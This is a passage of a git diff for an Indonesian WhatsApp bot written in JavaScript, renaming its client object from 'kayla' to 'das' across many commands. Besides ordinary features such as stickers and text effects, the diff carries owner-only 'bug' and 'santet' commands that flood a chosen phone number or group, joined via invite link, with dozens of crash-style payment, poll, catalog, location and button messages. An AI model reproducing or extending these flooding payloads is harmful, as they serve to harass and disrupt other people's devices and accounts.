             .catch((err) => reply(jsonformat(err)));
@@ -2863,7 +2865,7 @@ Isi Pesan : ${pesan}
           if (!isAdmins && !isOwner) return reply(mess.admin);
           // if (!isBotAdmins) return reply(mess.botAdmin);
           if (!q) return reply(`Teks?`);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { text: q ? q : '', mentions: participants.map((a) => a.id) },
             { quoted: m }
@@ -2880,7 +2882,7 @@ Isi Pesan : ${pesan}
           for (let mem of participants) {
             teks += `➲ @${mem.id.split('@')[0]}\n`;
           }
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { text: teks, mentions: participants.map((a) => a.id) },
             { quoted: m }
@@ -2951,7 +2953,7 @@ Hasil : ${kay.hasil_nya}
 Tingkat Kesulitan : ${kay.tingkat_kesulitan}
 Bahan :
 ${kay.bahan_nya}`;
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             {
               image: {
@@ -2989,7 +2991,7 @@ ${kay.bahan_nya}`;
           ],
           listType: 1,
         };
-        const sendMsg = await kayla.sendMessage(from, buttonNya);
+        const sendMsg = await das.sendMessage(from, buttonNya);
         break;
       case 'play':
         {
@@ -3034,7 +3036,7 @@ Channel : ${anu.author.url}`;
               mentionedJid: [sender, owned],
             },
           };
-          kayla.sendMessage(m.chat, buttonMessages, {
+          das.sendMessage(m.chat, buttonMessages, {
             quoted: {
               key: {
                 fromMe: false,
@@ -3074,7 +3076,7 @@ Channel : ${anu.author.url}`;
       case 'donasi':
       case 'donate':
         {
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               image: qrisdonate,
@@ -3135,7 +3137,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         //             sections: seactiones,
         //             listType: 1,
         //           };
-        //           kayla.sendMessage(from, listSw, { quoted: m });
+        //           das.sendMessage(from, listSw, { quoted: m });
         //         }
         //         break;
         //  case 'addprem':
@@ -3147,7 +3149,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             } 6285768966412`
           );
         prrkek = q.split('|')[0].replace(/[^0-9]/g, '') + `@s.whatsapp.net`;
-        let ceknya = await kayla.onWhatsApp(prrkek);
+        let ceknya = await das.onWhatsApp(prrkek);
         if (ceknya.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -3175,7 +3177,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           if (!isOwner) return reply(mess.owner);
           if (args.length < 1) return reply('Nama audionya apa');
           if (vnnye.includes(q)) return reply('Nama tersebut sudah di gunakan');
-          let delb = await kayla.downloadAndSaveMediaMessage(quoted);
+          let delb = await das.downloadAndSaveMediaMessage(quoted);
           vnnye.push(q);
           await fsx.copy(delb, `./database/Audio/${q}.mp3`);
           fs.writeFileSync('./database/vnadd.json', JSON.stringify(vnnye));
@@ -3215,7 +3217,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             } 6285768966412`
           );
         bnnd = q.split('|')[0].replace(/[^0-9]/g, '');
-        let ceknye = await kayla.onWhatsApp(bnnd + `@s.whatsapp.net`);
+        let ceknye = await das.onWhatsApp(bnnd + `@s.whatsapp.net`);
         if (ceknye.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -3240,16 +3242,14 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         break;
       case 'listpremium':
         teks = '*List Premium*\n\n';
-        for (let kayla of prem) {
-          teks += `- ${kayla}\n`;
+        for (let das of prem) {
+          teks += `- ${das}\n`;
         }
         teks += `\n*Total : ${prem.length}*`;
-        kayla.sendMessage(
-          m.chat,
-          { text: teks.trim() },
-          'extendedTextMessage',
-          { quoted: m, contextInfo: { mentionedJid: prem } }
-        );
+        das.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', {
+          quoted: m,
+          contextInfo: { mentionedJid: prem },
+        });
         break;
       case 'setppbot':
         {
@@ -3266,13 +3266,13 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Image Dengan Caption ${prefix + command}`
             );
-          var medis = await kayla.downloadAndSaveMediaMessage(
+          var medis = await das.downloadAndSaveMediaMessage(
             quoted,
             'ppbot.jpeg'
           );
           if (args[0] == `/kay`) {
             var { img } = await generateProfilePicture(medis);
-            await kayla.query({
+            await das.query({
               tag: 'iq',
               attrs: {
                 to: botNumber,
@@ -3290,7 +3290,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             fs.unlinkSync(medis);
             reply(`Sukses`);
           } else {
-            var memeg = await kayla.updateProfilePicture(botNumber, {
+            var memeg = await das.updateProfilePicture(botNumber, {
               url: medis,
             });
             fs.unlinkSync(medis);
@@ -3327,7 +3327,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           ],
           listType: 1,
         };
-        const sendMsge = await kayla.sendMessage(from, listMessageNya);
+        const sendMsge = await das.sendMessage(from, listMessageNya);
         break;
       case 'addlist':
         if (!isOwner) return reply(mess.owner);
@@ -3347,7 +3347,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             `List respon dengan key : *${args1}* sudah ada di group ini.`
           );
         if (/image/.test(mime)) {
-          media = await kayla.downloadAndSaveMediaMessage(quoted);
+          media = await das.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(media);
           addResponList(from, args1, args2, true, `${mem}`, db_respon_list);
           reply(`Sukses set list message dengan key : *${args1}*`);
@@ -3391,7 +3391,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             `Maaf, untuk key *${args1}* belum terdaftar di group ini`
           );
         if (/image/.test(mime)) {
-          media = await kayla.downloadAndSaveMediaMessage(quoted);
+          media = await das.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(media);
           updateResponList(from, args1, args2, true, `${mem}`, db_respon_list);
           reply(`Sukses update list message dengan key : *${args1}*`);
@@ -3410,8 +3410,8 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               }\nDurasi Video 1-9 Detik`
             );
           if (/image/.test(mime)) {
-            let media = await kayla.downloadAndSaveMediaMessage(quoted);
-            let encmedia = await kayla.sendImageAsSticker(
+            let media = await das.downloadAndSaveMediaMessage(quoted);
+            let encmedia = await das.sendImageAsSticker(
               m.chat,
               await rmbg(media),
               m,
@@ -3429,9 +3429,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`
             );
-          mee = await kayla.downloadAndSaveMediaMessage(quoted);
+          mee = await das.downloadAndSaveMediaMessage(quoted);
           mem = await uptotelegra(mee);
-          kayla.sendMessage(m.chat, { text: mem }, { quoted: m });
+          das.sendMessage(m.chat, { text: mem }, { quoted: m });
         } catch (err) {
           reply(`Reply Image Nya Bang`);
         }
@@ -3450,12 +3450,12 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             return reply(
               `Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`
             );
-          meeh = await kayla.downloadAndSaveMediaMessage(quoted);
+          meeh = await das.downloadAndSaveMediaMessage(quoted);
           memh = await uptotelegra(meeh);
           gdye = await getBuffer(
             `https://some-random-api.ml/canvas/${command}?avatar=${memh}`
           );
-          kayla.sendImageAsSticker(m.chat, gdye, m, {
+          das.sendImageAsSticker(m.chat, gdye, m, {
             packname: global.packname,
             author: global.author,
           });
@@ -3470,9 +3470,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await kayla.downloadAndSaveMediaMessage(quoted);
+        mee = await das.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             audio: { url: mem },
@@ -3490,9 +3490,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await kayla.downloadAndSaveMediaMessage(quoted);
+        mee = await das.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             audio: { url: mem },
@@ -3516,9 +3516,9 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
               prefix + command
             }`
           );
-        mee = await kayla.downloadAndSaveMediaMessage(quoted);
+        mee = await das.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           {
             document: { url: mem },
@@ -3539,12 +3539,12 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           return reply(
             `Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`
           );
-        mee = await kayla.downloadAndSaveMediaMessage(quoted);
+        mee = await das.downloadAndSaveMediaMessage(quoted);
         mem = await uptotelegra(mee);
         kaytid = await getBuffer(
           `https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`
         );
-        kayla.sendImageAsSticker(m.chat, kaytid, m, {
+        das.sendImageAsSticker(m.chat, kaytid, m, {
           packname: global.packname,
           author: global.author,
         });
@@ -4346,7 +4346,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
 
 *≡═════《 CEKSIFATME 》═════≡*`;
         buff = await getBuffer(ppuser);
-        kayla.sendMessage(
+        das.sendMessage(
           from,
           { image: buff, caption: profile, mentions: [bet] },
           { quoted: m }
@@ -4356,13 +4356,13 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         {
           if (!/webp/.test(mime))
             return reply(`balas stiker dengan caption *${prefix + command}*`);
-          let media = await kayla.downloadAndSaveMediaMessage(quoted);
+          let media = await das.downloadAndSaveMediaMessage(quoted);
           let ran = await getRandom('.png');
           exec(`ffmpeg -i ${media} ${ran}`, (err) => {
             fs.unlinkSync(media);
             if (err) throw err;
             let buffer = fs.readFileSync(ran);
-            kayla.sendMessage(
+            das.sendMessage(
               m.chat,
               {
                 image: buffer,
@@ -4399,7 +4399,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             );
           if (/image/.test(mime)) {
             let media = await quoted.download();
-            let encmedia = await kayla.sendImageAsSticker(m.chat, media, m, {
+            let encmedia = await das.sendImageAsSticker(m.chat, media, m, {
               packname: global.packname,
               author: global.author,
             });
@@ -4410,7 +4410,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
                 `Kirim/Reply Gambar/Video/Gifs Dengan Caption ${pre}\nDurasi Video 1-9 Detik`
               );
             let media = await quoted.download();
-            let encmedia = await kayla.sendVideoAsSticker(m.chat, media, m, {
+            let encmedia = await das.sendVideoAsSticker(m.chat, media, m, {
               packname: global.packname,
               author: global.author,
             });
@@ -4463,7 +4463,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
           if (!m.isGroup) return reply(mess.group);
           let member = participants.map((u) => u.id);
           let org = member[Math.floor(Math.random() * member.length)];
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text: `anak ${command} di sini adalah @${org.split('@')[0]}`,
@@ -4536,7 +4536,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
         const cex = body.slice(0);
         const cek2 = cek1[Math.floor(Math.random() * cek1.length)];
         if (mentionByReply) {
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text:
@@ -4552,7 +4552,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             { quoted: m }
           );
         } else if (mentionByTag[0] && isGroup) {
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text:
@@ -4568,7 +4568,7 @@ Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`,
             { quoted: m }
           );
         } else if (!mentionByReply && !mentionByTag[0]) {
-          kayla.sendMessage(
+          das.sendMessage(
             from,
             {
               text:
@@ -4640,7 +4640,7 @@ ${meg.result}`);
             }),
             { userJid: m.chat, quoted: crsh }
           );
-          kayla.relayMessage(m.chat, pollCreation.message, {
+          das.relayMessage(m.chat, pollCreation.message, {
             messageId: pollCreation.key.id,
           });
           reply(mess.succes);
@@ -4652,7 +4652,7 @@ ${meg.result}`);
           num = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
           jumlah = '30';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(num, { text: `hai` }, { quoted: lep });
+            das.sendMessage(num, { text: `hai` }, { quoted: lep });
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`);
@@ -4669,7 +4669,7 @@ ${meg.result}`);
             );
           jumlah = '15';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(
+            das.sendMessage(
               `${q}`.split('-').join('').split(' ').join('').replace('+', '') +
                 '@s.whatsapp.net',
               { sticker: ppnyauser },
@@ -4715,7 +4715,7 @@ ${meg.result}`);
                 prefix + command
               } 6285768966412`
             );
-          kayla.relayMessage(
+          das.relayMessage(
             m.mentionedJid[0]
               ? m.mentionedJid[0]
               : m.quoted
@@ -4754,7 +4754,7 @@ ${meg.result}`);
       case 'jagoanneon':
         {
           if (!isOwner) return reply(mess.owner);
-          kayla.relayMessage(
+          das.relayMessage(
             m.mentionedJid[0]
               ? m.mentionedJid[0]
               : m.quoted
@@ -4804,7 +4804,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: kayla.waUploadToServer }
+              { upload: das.waUploadToServer }
             );
             var liveLocation = generateWAMessageFromContent(
               num,
@@ -4822,7 +4822,7 @@ ${meg.result}`);
               }),
               { userJid: num, quoted: lep }
             );
-            kayla.relayMessage(num, liveLocation.message, {
+            das.relayMessage(num, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
             await sleep(1000);
@@ -4842,7 +4842,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.relayMessage(
+            das.relayMessage(
               num,
               {
                 requestPaymentMessage: {
@@ -4877,7 +4877,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(
+            das.sendMessage(
               num,
               {
                 audio: audionye,
@@ -4905,7 +4905,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendContact(num, owner, lep);
+            das.sendContact(num, owner, lep);
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`);
@@ -4923,7 +4923,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(
+            das.sendMessage(
               num,
               {
                 document: ppnyauser,
@@ -4952,7 +4952,7 @@ ${meg.result}`);
           num = `${q}` + '@s.whatsapp.net';
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(num, { sticker: ppnyauser }, { quoted: lep });
+            das.sendMessage(num, { sticker: ppnyauser }, { quoted: lep });
             await sleep(1000);
           }
           reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`);
@@ -4999,7 +4999,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: kayla.waUploadToServer }
+              { upload: das.waUploadToServer }
             );
             var catalog = generateWAMessageFromContent(
               num,
@@ -5023,7 +5023,7 @@ ${meg.result}`);
               }),
               { userJid: m.chat, quoted: lep }
             );
-            kayla.relayMessage(num, catalog.message, {
+            das.relayMessage(num, catalog.message, {
               messageId: catalog.key.id,
             });
             await sleep(1000);
@@ -5038,7 +5038,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: kayla.waUploadToServer }
+              { upload: das.waUploadToServer }
             );
             var catalog = generateWAMessageFromContent(
               m.chat,
@@ -5062,7 +5062,7 @@ ${meg.result}`);
               }),
               { userJid: m.chat, quoted: lep }
             );
-            kayla.relayMessage(m.chat, catalog.message, {
+            das.relayMessage(m.chat, catalog.message, {
               messageId: catalog.key.id,
             });
             await sleep(1000);
@@ -5077,7 +5077,7 @@ ${meg.result}`);
           for (let i = 0; i < jumlah; i++) {
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: kayla.waUploadToServer }
+              { upload: das.waUploadToServer }
             );
             var liveLocation = generateWAMessageFromContent(
               m.chat,
@@ -5095,7 +5095,7 @@ ${meg.result}`);
               }),
               { userJid: m.chat, quoted: lep }
             );
-            kayla.relayMessage(m.chat, liveLocation.message, {
+            das.relayMessage(m.chat, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
             await sleep(1000);
@@ -5108,7 +5108,7 @@ ${meg.result}`);
           if (!isOwner) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendContact(m.chat, owner, lep);
+            das.sendContact(m.chat, owner, lep);
             await sleep(1000);
           }
           reply(`Sukses Send Bug Sebanyak ${jumlah}`);
@@ -5139,7 +5139,7 @@ ${meg.result}`);
           if (!isOwner) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(m.chat, { sticker: ppnyauser }, { quoted: lep });
+            das.sendMessage(m.chat, { sticker: ppnyauser }, { quoted: lep });
           }
           reply(`Sukses Send Bug Sebanyak ${jumlah}`);
         }
@@ -5149,7 +5149,7 @@ ${meg.result}`);
           if (!isOwner) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(
+            das.sendMessage(
               m.chat,
               {
                 document: ppnyauser,
@@ -5171,7 +5171,7 @@ ${meg.result}`);
           if (!isOwner) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.sendMessage(
+            das.sendMessage(
               m.chat,
               {
                 audio: audionye,
@@ -5192,7 +5192,7 @@ ${meg.result}`);
           if (!isOwner) return reply(mess.owner);
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            kayla.relayMessage(
+            das.relayMessage(
               m.chat,
               {
                 requestPaymentMessage: {
@@ -5221,7 +5221,7 @@ ${meg.result}`);
         nmn = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         if (Input == creator)
           return reply('Tidak Bisa, Karena Itu Nomer Developer');
-        let hdhe = await kayla.onWhatsApp(nmn);
+        let hdhe = await das.onWhatsApp(nmn);
         if (hdhe.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -5234,7 +5234,7 @@ ${meg.result}`);
         if (!isUrl(args[0]) && !args[0].includes('whatsapp.com'))
           return reply('Link Invalid!');
         let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1];
-        let mnm = await kayla.groupAcceptInvite(fhehfhe);
+        let mnm = await das.groupAcceptInvite(fhehfhe);
         santedgc(bygbt, mnm, sleep);
         break;
       case 'santetpc':
@@ -5243,14 +5243,14 @@ ${meg.result}`);
         tosend = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
         if (Input == creator)
           return reply('Tidak Bisa, Karena Itu Nomer Developer');
-        let kgdhwus = await kayla.onWhatsApp(tosend);
+        let kgdhwus = await das.onWhatsApp(tosend);
         if (kgdhwus.length == 0)
           return reply(
             `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
           );
         jumlah = '30';
         for (let i = 0; i < jumlah; i++) {
-          kayla.sendMessage(tosend, {
+          das.sendMessage(tosend, {
             text: '',
             templateButtons: [
               { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5278,8 +5278,8 @@ ${meg.result}`);
         let resultny = args[0].split('https://chat.whatsapp.com/')[1];
         jumlah = '30';
         for (let i = 0; i < jumlah; i++) {
-          let tosendgc = await kayla.groupAcceptInvite(resultny);
-          kayla.sendMessage(tosendgc, {
+          let tosendgc = await das.groupAcceptInvite(resultny);
+          das.sendMessage(tosendgc, {
             text: '',
             templateButtons: [
               { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5310,7 +5310,7 @@ ${meg.result}`);
             );
           numt = q.split('|')[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
           jumlah = q.split('|')[1];
-          let cekno = await kayla.onWhatsApp(numt);
+          let cekno = await das.onWhatsApp(numt);
           if (cekno.length == 0)
             return reply(
               `Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`
@@ -5351,7 +5351,7 @@ ${meg.result}`);
           );
           var messa = await prepareWAMessageMedia(
             { image: ppnyauser },
-            { upload: kayla.waUploadToServer }
+            { upload: das.waUploadToServer }
           );
           var order = generateWAMessageFromContent(
             from,
@@ -5466,10 +5466,10 @@ ${meg.result}`);
             { userJid: from, quoted: lep }
           );
           for (let i = 0; i < jumlah; i++) {
-            kayla.relayMessage(numt, buginvite.message, {
+            das.relayMessage(numt, buginvite.message, {
               messageId: buginvite.key.id,
             });
-            kayla.relayMessage(
+            das.relayMessage(
               numt,
               {
                 requestPaymentMessage: {
@@ -5487,35 +5487,35 @@ ${meg.result}`);
               },
               {}
             );
-            kayla.relayMessage(numt, pollCreation.message, {
+            das.relayMessage(numt, pollCreation.message, {
               messageId: pollCreation.key.id,
             });
-            kayla.relayMessage(numt, order.message, {
+            das.relayMessage(numt, order.message, {
               messageId: order.key.id,
             });
-            kayla.relayMessage(numt, audio.message, {
+            das.relayMessage(numt, audio.message, {
               messageId: audio.key.id,
             });
-            kayla.relayMessage(numt, image.message, {
+            das.relayMessage(numt, image.message, {
               messageId: image.key.id,
             });
-            kayla.relayMessage(numt, document.message, {
+            das.relayMessage(numt, document.message, {
               messageId: document.key.id,
             });
-            kayla.relayMessage(numt, liveLocation.message, {
+            das.relayMessage(numt, liveLocation.message, {
               messageId: liveLocation.key.id,
             });
-            kayla.relayMessage(numt, sticker.message, {
+            das.relayMessage(numt, sticker.message, {
               messageId: sticker.key.id,
             });
-            kayla.sendKatalog(
+            das.sendKatalog(
               numt,
               `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
               `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,
               ppnyauser,
               { quoted: lep }
             );
-            kayla.sendMessage(numt, {
+            das.sendMessage(numt, {
               text: '',
               templateButtons: [
                 { callButton: { displayText: `P`, phoneNumber: `` } },
@@ -5543,8 +5543,8 @@ ${meg.result}`);
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await kayla.groupAcceptInvite(result);
-            kayla.relayMessage(
+            let kir = await das.groupAcceptInvite(result);
+            das.relayMessage(
               kir,
               {
                 requestPaymentMessage: {
@@ -5576,8 +5576,8 @@ ${meg.result}`);
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await kayla.groupAcceptInvite(result);
-            kayla.sendMessage(
+            let kir = await das.groupAcceptInvite(result);
+            das.sendMessage(
               kir,
               {
                 document: ppnyauser,
@@ -5602,10 +5602,10 @@ ${meg.result}`);
           let result = args[0].split('https://chat.whatsapp.com/')[1];
           jumlah = '25';
           for (let i = 0; i < jumlah; i++) {
-            let kir = await kayla.groupAcceptInvite(result);
+            let kir = await das.groupAcceptInvite(result);
             var messa = await prepareWAMessageMedia(
               { image: ppnyauser },
-              { upload: kayla.waUploadToServer }
+              { upload: das.waUploadToServer }
             );
             var location = generateWAMessageFromContent(
               kir,
@@ -5620,7 +5620,7 @@ ${meg.result}`);
               }),
               { userJid: from, quoted: lep }
             );
-            kayla.relayMessage(kir, location.message, {
+            das.relayMessage(kir, location.message, {
               messageId: location.key.id,
             });
             await sleep(1000);
@@ -5843,7 +5843,7 @@ ${meg.result}`);
           if (/leaves/.test(command))
             link = 'https://textpro.me/natural-leaves-text-effect-931.html';
           let anu = await textpro.textpro(link, q);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { image: { url: anu }, caption: `${mess.succes}` },
             { quoted: m }
@@ -5973,7 +5973,7 @@ ${meg.result}`);
             link =
               'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html';
           let haldwhd = await ephoto(link, q);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { image: { url: haldwhd }, caption: `${mess.succes}` },
             { quoted: m }
@@ -6093,7 +6093,7 @@ ${meg.result}`);
             link =
               'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html';
           let dehe = await photooxy.photoOxy(link, q);
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { image: { url: dehe }, caption: `${mess.succes}` },
             { quoted: m }
@@ -6745,7 +6745,7 @@ ${meg.result}`);
               mentionedJid: [sender],
             },
           };
-          kayla.sendMessage(m.chat, buttonMessaage, { quoted: m });
+          das.sendMessage(m.chat, buttonMessaage, { quoted: m });
         }
         break;
 
@@ -6758,7 +6758,7 @@ ${meg.result}`);
         if (!isPrem) return replyprem(mess.premium);
         neys = await fetchJson(`https://some-random-api.ml/img/${command}`);
         anu1 = await getBuffer(neys.link);
-        kayla.sendMessage(
+        das.sendMessage(
           m.chat,
           { image: anu1, caption: `${mess.succes}` },
           { quoted: m }
@@ -6771,7 +6771,7 @@ ${meg.result}`);
             'https://raw.githubusercontent.com/KirBotz/nyenyee/master/meryani.json'
           );
           let hayu = kaydt[Math.floor(Math.random() * kaydt.length)];
-          kayla.sendMessage(
+          das.sendMessage(
             m.chat,
             { video: { url: hayu }, caption: `${mess.succes}` },
             { quoted: m }
@@ -7301,7 +7301,7 @@ ${meg.result}`);
           if (m.isBaileys) return;
           let msgs = global.db.database;
           if (!(budy.toLowerCase() in msgs)) return;
-          kayla.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
+          das.copyNForward(m.chat, msgs[budy.toLowerCase()], true);
         }
     }
   } catch (err) {
@@ -7309,7 +7309,7 @@ ${meg.result}`);
     console.log(util.format(err));
     let e = JSON.stringify(err);
     console.log(typeof e);
-    kayla.sendMessage(
+    das.sendMessage(
       ownerNumber,
       {
         text: util.format(err),
